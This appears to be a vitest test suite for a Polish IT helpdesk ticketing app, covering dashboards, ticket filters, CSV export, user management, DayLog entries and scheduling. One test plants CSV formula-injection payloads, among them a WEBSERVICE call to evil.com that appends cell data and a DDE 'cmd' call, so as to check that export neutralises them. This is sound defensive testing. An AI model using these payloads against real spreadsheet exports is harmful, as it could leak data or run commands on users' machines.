import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import { unlink } from "node:fs/promises";
import path from "node:path";
import type { User } from "@/lib/types";

// Mock server-only and next/cache for vitest environment
vi.mock("server-only", () => ({}));
vi.mock("next/cache", () => ({
  unstable_noStore: () => {}
}));

const dataFile = path.join(process.cwd(), ".data", "fixit-db.json");

async function resetDatabase() {
  try {
    await unlink(dataFile);
  } catch {
    // File doesn't exist yet - that's fine
  }
}

describe("getStoreDashboard", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns zero metrics for store with no tickets", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_waw01");

    expect(dashboard.openTickets).toBe(0);
    expect(dashboard.criticalTickets).toBe(0);
    expect(dashboard.blockingTickets).toBe(0);
    expect(dashboard.resolvedToday).toBe(0);
    expect(dashboard.recentEvents).toHaveLength(0);
  });

  it("returns zero metrics for store_krk02 (no tickets)", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_krk02");

    expect(dashboard.openTickets).toBe(0);
    expect(dashboard.criticalTickets).toBe(0);
    expect(dashboard.blockingTickets).toBe(0);
    expect(dashboard.resolvedToday).toBe(0);
    expect(dashboard.recentEvents).toHaveLength(0);
  });

  it("returns empty events list when no tickets exist", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_waw01");

    expect(dashboard.recentEvents).toHaveLength(0);
  });
});

describe("getDashboardMetrics", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns zero metrics from seed data (no tickets yet)", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.totalTickets).toBe(0);
    expect(metrics.openTickets).toBe(0);
    expect(metrics.criticalTickets).toBe(0);
    expect(metrics.avgResolutionHours).toBeNull();
  });

  it("returns empty top categories when no tickets exist", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.topCategories).toHaveLength(0);
  });

  it("returns empty SLA breaches when no tickets exist", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.slaBreached).toHaveLength(0);
  });
});

describe("listVisibleTickets filters", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("applies search, status and priority filters in the JSON data provider", async () => {
    const { createTicket, findUserByEmail, listVisibleTickets } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");

    expect(admin).toBeDefined();

    await createTicket({
      title: "Drukarka fiskalna nie działa",
      description: "Stanowisko 2 nie drukuje paragonów.",
      blocksWork: false,
      contact: "sklep@bagietka.pl",
      categoryId: "cat_printer",
      reporterId: admin!.id,
      priority: "HIGH"
    });

    await createTicket({
      title: "Internet działa wolno",
      description: "Problem z siecią w biurze.",
      blocksWork: false,
      contact: "biuro@bagietka.pl",
      categoryId: "cat_network",
      reporterId: admin!.id,
      priority: "NORMAL"
    });

    const results = await listVisibleTickets(admin!, {
      query: "drukarka",
      status: "NEW",
      priority: "HIGH"
    });

    expect(results).toHaveLength(1);
    expect(results[0]?.title).toBe("Drukarka fiskalna nie działa");
  });

  it("limits store manager lists to tickets they reported", async () => {
    const { readDatabase, writeDatabase, listVisibleTickets } = await import("@/lib/data-store");
    const database = await readDatabase();
    const manager: User = { id: "manager", name: "Manager", email: "manager@bagietka.pl", role: "STORE_MANAGER", storeId: "store1", isActive: true };
    const otherReporter: User = { ...manager, id: "other", email: "other@bagietka.pl", role: "REPORTER" };
    const baseTicket = {
      id: "ticket-template",
      number: "IT-2026-0001",
      title: "Test ticket",
      description: "Description long enough for a data-store fixture.",
      status: "NEW" as const,
      priority: "NORMAL" as const,
      blocksWork: false,
      contact: "manager@bagietka.pl",
      categoryId: "cat_other",
      storeId: "store1",
      reporterId: manager.id,
      createdAt: "2026-08-17T10:00:00.000Z",
      updatedAt: "2026-08-17T10:00:00.000Z"
    };
    database.users.push(manager, otherReporter);
    database.tickets.push(
      { ...baseTicket, id: "own", reporterId: manager.id },
      { ...baseTicket, id: "coworker", reporterId: otherReporter.id }
    );
    await writeDatabase(database);

    const visible = await listVisibleTickets(manager);
    expect(visible.map((item) => item.id)).toEqual(["own"]);
  });
});

describe("ticket lifecycle timestamps", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("clears stale resolution and closure timestamps when a ticket is reopened", async () => {
    const { createTicket, findUserByEmail, updateTicket } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");

    expect(admin).toBeDefined();

    const ticket = await createTicket({
      title: "Test cyklu życia",
      description: "Sprawdzenie znaczników czasu statusu.",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: admin!.id,
      priority: "NORMAL"
    });

    const resolved = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "RESOLVED",
      priority: ticket.priority
    });
    expect(resolved?.resolvedAt).toBeDefined();

    const reopened = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "IN_PROGRESS",
      priority: ticket.priority
    });
    expect(reopened?.resolvedAt).toBeNull();

    const closed = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "CLOSED",
      priority: ticket.priority
    });
    expect(closed?.closedAt).toBeDefined();

    const reopenedAgain = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "IN_PROGRESS",
      priority: ticket.priority
    });
    expect(reopenedAgain?.closedAt).toBeNull();
  });
});

describe("exportTicketsCSV", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns CSV with header row only when no tickets exist", async () => {
    const { exportTicketsCSV } = await import("@/lib/data-store");

    const csv = await exportTicketsCSV();

    const lines = csv.trim().split("\n");
    expect(lines.length).toBe(1); // header only

    // Header should contain expected columns
    expect(lines[0]).toContain("Numer");
    expect(lines[0]).toContain("Tytul");
    expect(lines[0]).toContain("Status");
    expect(lines[0]).toContain("Priorytet");
  });
});

describe("CSV injection prevention", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("neutralizes formula injection in ticket titles via export", async () => {
    const { createTicket, exportTicketsCSV } = await import("@/lib/data-store");

    // Create tickets with formula-like titles
    await createTicket({
      title: "=WEBSERVICE(\"https://evil.com/\"&A1)",
      description: "Test formula injection",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "+SUM(1,1)",
      description: "Plus formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "-DDE(\"cmd\")",
      description: "Minus formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "@SUM(1,1)",
      description: "At formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "\t=HYPERLINK(\"https://evil.example\")",
      description: "Whitespace bypass",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "\r=1+1",
      description: "Carriage return bypass",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    // Safe title should not be affected
    await createTicket({
      title: "Normal title with no injection",
      description: "Safe",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    const csv = await exportTicketsCSV();

    // Formula values should be neutralized (prepended with single quote prefix)
    // The single quote prevents spreadsheet software from executing formulas
    expect(csv).toContain("'=WEBSERVICE");
    expect(csv).toContain("'+SUM");
    expect(csv).toContain("'-DDE");
    expect(csv).toContain("'@SUM");
    expect(csv).toContain("'\t=HYPERLINK");
    expect(csv).toContain("'\r=1+1");

    // Safe values should remain unchanged
    expect(csv).toContain("Normal title with no injection");
  });
});

describe("internal ticket metadata visibility", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("hides internal-note events and attachments from non-agent views", async () => {
    const { addComment, createAttachment, createTicket, findUserByEmail, listAttachments, listEvents } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");
    expect(admin).toBeDefined();

    const ticket = await createTicket({
      title: "Widoczność notatek",
      description: "Dane wewnętrzne nie mogą wyciekać.",
      blocksWork: false,
      contact: admin!.email,
      categoryId: "cat_other",
      reporterId: admin!.id,
      priority: "NORMAL"
    });
    const internalComment = await addComment({
      ticketId: ticket.id,
      authorId: admin!.id,
      body: "Tajne dane serwisowe",
      visibility: "INTERNAL"
    });
    expect(internalComment).toBeDefined();
    await createAttachment({
      ticketId: ticket.id,
      commentId: internalComment!.id,
      filename: "internal.txt",
      mimeType: "text/plain",
      size: 10,
      storageKey: "abcdef0123456789abcdef0123456789",
      uploadedById: admin!.id
    });
    await createAttachment({
      ticketId: ticket.id,
      filename: "public.txt",
      mimeType: "text/plain",
      size: 10,
      storageKey: "0123456789abcdef0123456789abcdef",
      uploadedById: admin!.id
    });

    expect((await listEvents(ticket.id, true)).some((event) => event.type === "INTERNAL_NOTE_CREATED")).toBe(true);
    expect((await listEvents(ticket.id, false)).some((event) => event.type === "INTERNAL_NOTE_CREATED")).toBe(false);
    expect((await listAttachments(ticket.id, true)).map((attachment) => attachment.filename)).toEqual([
      "internal.txt",
      "public.txt"
    ]);
    expect((await listAttachments(ticket.id, false)).map((attachment) => attachment.filename)).toEqual(["public.txt"]);
  });

  it("rejects attachments linked to a comment from another ticket", async () => {
    const { addComment, createAttachment, createTicket, findUserByEmail } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");
    expect(admin).toBeDefined();

    const first = await createTicket({
      title: "Pierwsze zgłoszenie",
      description: "Źródło komentarza.",
      blocksWork: false,
      contact: admin!.email,
      categoryId: "cat_other",
      reporterId: admin!.id,
      priority: "NORMAL"
    });
    const second = await createTicket({
      title: "Drugie zgłoszenie",
      description: "Nie może przejąć komentarza.",
      blocksWork: false,
      contact: admin!.email,
      categoryId: "cat_other",
      reporterId: admin!.id,
      priority: "NORMAL"
    });
    const comment = await addComment({
      ticketId: first.id,
      authorId: admin!.id,
      body: "Komentarz pierwszego zgłoszenia",
      visibility: "PUBLIC"
    });

    await expect(createAttachment({
      ticketId: second.id,
      commentId: comment!.id,
      filename: "invalid.txt",
      mimeType: "text/plain",
      size: 10,
      storageKey: "fedcba9876543210fedcba9876543210",
      uploadedById: admin!.id
    })).rejects.toThrow("Komentarz nie należy do tego zgłoszenia.");
  });
});

describe("user creation", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("creates a new user and allows lookup by active email", async () => {
    const { createUser, findUserByEmail } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    expect(user.email).toBe("jan.kowalski@bagietka.pl");
    expect(user.role).toBe("REPORTER");

    const found = await findUserByEmail("jan.kowalski@bagietka.pl");
    expect(found?.id).toBe(user.id);
  });

  it("does not expose password hashes from display-oriented user lookups", async () => {
    const { createUser, findUserByEmail } = await import("@/lib/data-store");

    await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    expect((await findUserByEmail("jan.kowalski@bagietka.pl"))?.passwordHash).toBeUndefined();
    expect((await findUserByEmail("jan.kowalski@bagietka.pl", { includePasswordHash: true }))?.passwordHash).toBe("salt:hash");
  });

  it("does not return inactive users from standard email lookup", async () => {
    const { createUser, findUserByEmail } = await import("@/lib/data-store");

    await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: false,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    expect(await findUserByEmail("jan.kowalski@bagietka.pl")).toBeUndefined();
    expect(await findUserByEmail("jan.kowalski@bagietka.pl", { includeInactive: true })).toBeDefined();
  });

  it("adds an admin audit log when user is created by admin", async () => {
    const { createUser, listAdminAuditLogs } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: true,
      actorId: "usr_admin"
    });

    const logs = await listAdminAuditLogs(5);
    expect(logs[0]?.action).toBe("USER_CREATED");
    expect(logs[0]?.entityId).toBe(user.id);
  });

  it("deletes a user without historical records and writes an audit log", async () => {
    const { createUser, deleteUserAdmin, findUserByEmail, listAdminAuditLogs } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: true,
      actorId: "usr_admin"
    });

    await expect(deleteUserAdmin({ userId: user.id, actorId: "usr_admin" })).resolves.toBe(true);

    expect(await findUserByEmail("jan.kowalski@bagietka.pl", { includeInactive: true })).toBeUndefined();
    const logs = await listAdminAuditLogs(5);
    expect(logs[0]?.action).toBe("USER_DELETED");
    expect(logs[0]?.entityId).toBe(user.id);
  });

  it("blocks deleting a user with reported tickets", async () => {
    const { createTicket, createUser, deleteUserAdmin } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    await createTicket({
      title: "Test",
      description: "Ticket created by reporter",
      blocksWork: false,
      contact: user.email,
      categoryId: "cat_other",
      reporterId: user.id,
      priority: "NORMAL"
    });

    await expect(deleteUserAdmin({ userId: user.id, actorId: "usr_admin" })).rejects.toThrow(
      "Dezaktywuj konto zamiast usuwać"
    );
  });
});

describe("listVisibleTicketsPage pagination", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns stable cursor pages without loading the full result set into the caller", async () => {
    const { createTicket, findUserByEmail, listVisibleTicketsPage } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");

    expect(admin).toBeDefined();

    for (let index = 0; index < 3; index += 1) {
      await createTicket({
        title: `Testowe zgłoszenie ${index}`,
        description: "Opis testowego zgłoszenia.",
        blocksWork: false,
        contact: "test@bagietka.pl",
        categoryId: "cat_other",
        reporterId: admin!.id,
        priority: "NORMAL"
      });
    }

    const firstPage = await listVisibleTicketsPage(admin!, {}, { limit: 2 });
    expect(firstPage.tickets).toHaveLength(2);
    expect(firstPage.hasMore).toBe(true);
    expect(firstPage.nextCursor).toBeDefined();

    const secondPage = await listVisibleTicketsPage(admin!, {}, {
      limit: 2,
      cursor: firstPage.nextCursor
    });
    expect(secondPage.tickets).toHaveLength(1);
    expect(secondPage.hasMore).toBe(false);
    expect(new Set(firstPage.tickets.map((ticket) => ticket.id))).not.toContain(secondPage.tickets[0]?.id);
  });
});

describe("DayLog storage", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("creates entries with author details and lists the newest occurrence first", async () => {
    const { createDayLogEntry, listDayLogEntries } = await import("@/lib/data-store");

    const older = await createDayLogEntry({
      occurredAt: "2026-08-04T08:00:00.000Z",
      fromName: "Sklep Warszawa",
      subject: "Problem z kasą",
      description: "Kasa nie drukuje paragonów.",
      createdById: "usr_admin"
    });
    const newer = await createDayLogEntry({
      occurredAt: "2026-08-04T10:30:00.000Z",
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Połączenie zostało przywrócone po restarcie routera.",
      createdById: "usr_admin"
    });

    expect(older.createdByName).toBe("Krzysztof Graczyk");
    expect(older.createdByEmail).toBe("krzysztofgraczyk@bagietka.pl");
    expect(older.createdAt).toBe(older.updatedAt);

    const entries = await listDayLogEntries();
    expect(entries.map((entry) => entry.id)).toEqual([newer.id, older.id]);
    expect(entries[0]).toMatchObject({
      fromName: "Sklep Kraków",
      createdByName: "Krzysztof Graczyk",
      createdByEmail: "krzysztofgraczyk@bagietka.pl"
    });
  });

  it("returns an empty list for a newly seeded database", async () => {
    const { listDayLogEntries } = await import("@/lib/data-store");

    await expect(listDayLogEntries()).resolves.toEqual([]);
  });

  it("updates and deletes an existing DayLog entry", async () => {
    const { createDayLogEntry, deleteDayLogEntry, listDayLogEntries, updateDayLogEntry } = await import("@/lib/data-store");
    const entry = await createDayLogEntry({
      occurredAt: "2026-08-04T10:30:00.000Z",
      fromName: "Sklep Warszawa",
      subject: "Awaria kasy",
      description: "Kasa nie drukuje paragonów.",
      createdById: "usr_admin"
    });

    const updated = await updateDayLogEntry({
      id: entry.id,
      occurredAt: "2026-08-04T11:30:00.000Z",
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Połączenie przywrócone."
    });

    expect(updated).toMatchObject({
      id: entry.id,
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Połączenie przywrócone.",
      occurredAt: "2026-08-04T11:30:00.000Z"
    });
    expect(updated?.updatedAt).not.toBe(entry.updatedAt);
    await expect(deleteDayLogEntry(entry.id)).resolves.toBe(true);
    await expect(listDayLogEntries()).resolves.toEqual([]);
    await expect(deleteDayLogEntry(entry.id)).resolves.toBe(false);
  });

  it("blocks deletion of a user who authored a DayLog entry", async () => {
    const { createDayLogEntry, createUser, deleteUserAdmin } = await import("@/lib/data-store");
    const author = await createUser({
      name: "Technik DayLog",
      email: "daylog.technik@bagietka.pl",
      role: "AGENT",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    await createDayLogEntry({
      occurredAt: "2026-08-04T10:30:00.000Z",
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Telefoniczne zgłoszenie awarii.",
      createdById: author.id
    });

    await expect(deleteUserAdmin({ userId: author.id, actorId: "usr_admin" })).rejects.toThrow("wpisy DayLog");
  });
});

describe("ticket submission idempotency", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns the same ticket for concurrent submissions with one submission id", async () => {
    const { createTicketWithResult, readDatabase } = await import("@/lib/data-store");
    const input = {
      title: "Drukarka nie działa",
      description: "Drukarka na stanowisku 2 nie drukuje paragonów.",
      blocksWork: false,
      contact: "sklep@bagietka.pl",
      categoryId: "cat_printer",
      reporterId: "usr_admin",
      priority: "HIGH" as const,
      submissionId: "4f6d9e62-c7e5-4c9b-a0a8-8c6c1e72a5e1"
    };

    const [first, second] = await Promise.all([createTicketWithResult(input), createTicketWithResult(input)]);
    const database = await readDatabase();
    const matchingTickets = database.tickets.filter((ticket) => ticket.submissionId === input.submissionId);

    expect(first.ticket.id).toBe(second.ticket.id);
    expect([first.created, second.created].sort()).toEqual([false, true]);
    expect(matchingTickets).toHaveLength(1);
    expect(database.events.filter((event) => event.ticketId === first.ticket.id)).toHaveLength(1);
    expect(database.notificationLogs.filter((log) => log.ticketId === first.ticket.id)).toHaveLength(1);
  });

  it("links one DayLog entry to exactly one ticket", async () => {
    const { createDayLogEntry, createTicketWithResult, findDayLogEntry, readDatabase } = await import("@/lib/data-store");
    const entry = await createDayLogEntry({
      occurredAt: "2026-08-10T08:30:00.000Z",
      fromName: "Sklep Warszawa",
      subject: "Awaria drukarki",
      description: "Drukarka nie drukuje etykiet od rana.",
      createdById: "usr_admin"
    });
    const input = {
      title: entry.subject,
      description: entry.description,
      blocksWork: false,
      contact: entry.fromName,
      categoryId: "cat_printer",
      reporterId: "usr_admin",
      priority: "NORMAL" as const,
      dayLogEntryId: entry.id
    };

    const first = await createTicketWithResult({
      ...input,
      submissionId: "4f6d9e62-c7e5-4c9b-a0a8-8c6c1e72a5e2"
    });
    const second = await createTicketWithResult({
      ...input,
      submissionId: "4f6d9e62-c7e5-4c9b-a0a8-8c6c1e72a5e3"
    });
    const linkedEntry = await findDayLogEntry(entry.id);
    const database = await readDatabase();

    expect(first.created).toBe(true);
    expect(second).toEqual({ ticket: first.ticket, created: false });
    expect(linkedEntry).toMatchObject({ ticketId: first.ticket.id, ticketNumber: first.ticket.number });
    expect(database.tickets.filter((ticket) => ticket.id === first.ticket.id)).toHaveLength(1);
    expect(database.events.find((event) => event.ticketId === first.ticket.id)?.payload).toEqual({
      dayLogEntryId: entry.id
    });
  });
});

describe("weekly schedule storage", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  async function enableAdminForSchedule() {
    const { updateUserAdmin } = await import("@/lib/data-store");
    await updateUserAdmin({
      userId: "usr_admin",
      role: "ADMIN",
      department: "IT",
      isActive: true,
      isScheduleMember: true,
      scheduleOrder: 1,
      actorId: "usr_admin"
    });
  }

  it("stores schedule tasks and weekend duties", async () => {
    const { createScheduleTask, getWeeklySchedule, setScheduleDuty } = await import("@/lib/data-store");
    await enableAdminForSchedule();

    const task = await createScheduleTask({
      date: "2026-08-15",
      title: "Sprawdzenie kopii zapasowych",
      description: "Dyżur sobotni",
      assigneeId: "usr_admin",
      actorId: "usr_admin"
    });
    const duty = await setScheduleDuty({
      date: "2026-08-16",
      assigneeId: "usr_admin",
      isOnCall: true,
      actorId: "usr_admin"
    });
    const schedule = await getWeeklySchedule("2026-08-10");

    expect(schedule.members).toHaveLength(1);
    expect(schedule.members[0]).toMatchObject({ id: "usr_admin", isScheduleMember: true, scheduleOrder: 1 });
    expect(schedule.tasks).toEqual([task]);
    expect(schedule.duties).toEqual([duty]);
  });

  it("rejects new duties on workdays but permits removing legacy entries", async () => {
    const { setScheduleDuty } = await import("@/lib/data-store");
    await enableAdminForSchedule();

    await expect(setScheduleDuty({
      date: "2026-08-10",
      assigneeId: "usr_admin",
      isOnCall: true,
      actorId: "usr_admin"
    })).rejects.toThrow("Dyżur można ustawić tylko w sobotę lub niedzielę.");

    await expect(setScheduleDuty({
      date: "2026-08-10",
      assigneeId: "usr_admin",
      isOnCall: false,
      actorId: "usr_admin"
    })).resolves.toBeUndefined();
  });

  it("copies the previous week without carrying completion state", async () => {
    const { copyPreviousScheduleWeek, createScheduleTask, getWeeklySchedule, readDatabase, setScheduleDuty, toggleScheduleTask, writeDatabase } = await import("@/lib/data-store");
    await enableAdminForSchedule();
    const sourceTask = await createScheduleTask({
      date: "2026-08-10",
      title: "Przegląd serwerów",
      assigneeId: "usr_admin",
      actorId: "usr_admin"
    });
    await toggleScheduleTask({ id: sourceTask.id, actorId: "usr_admin" });
    await setScheduleDuty({
      date: "2026-08-16",
      assigneeId: "usr_admin",
      isOnCall: true,
      actorId: "usr_admin"
    });
    const database = await readDatabase();
    database.scheduleDuties ??= [];
    database.scheduleDuties.push({
      id: "legacy-workday-duty",
      date: "2026-08-10",
      assigneeId: "usr_admin",
      createdById: "usr_admin",
      createdAt: "2026-08-10T08:00:00.000Z"
    });
    await writeDatabase(database);

    await expect(copyPreviousScheduleWeek({ targetWeekStart: "2026-08-17", actorId: "usr_admin" })).resolves.toEqual({
      taskCount: 1,
      dutyCount: 1
    });
    const target = await getWeeklySchedule("2026-08-17");
    expect(target.tasks).toHaveLength(1);
    expect(target.tasks[0]).toMatchObject({ date: "2026-08-17", title: "Przegląd serwerów", isCompleted: false });
    expect(target.duties).toHaveLength(1);
    expect(target.duties[0]?.date).toBe("2026-08-23");
    await expect(copyPreviousScheduleWeek({ targetWeekStart: "2026-08-17", actorId: "usr_admin" })).rejects.toThrow(
      "Docelowy tydzień nie jest pusty."
    );
  });

  it("rejects assignments to users who are not enabled for the schedule", async () => {
    const { createScheduleTask } = await import("@/lib/data-store");

    await expect(createScheduleTask({
      date: "2026-08-10",
      title: "Nieprawidłowe zadanie",
      assigneeId: "usr_admin",
      actorId: "usr_admin"
    })).rejects.toThrow("Wybrany użytkownik nie jest aktywnym członkiem grafiku.");
  });
});
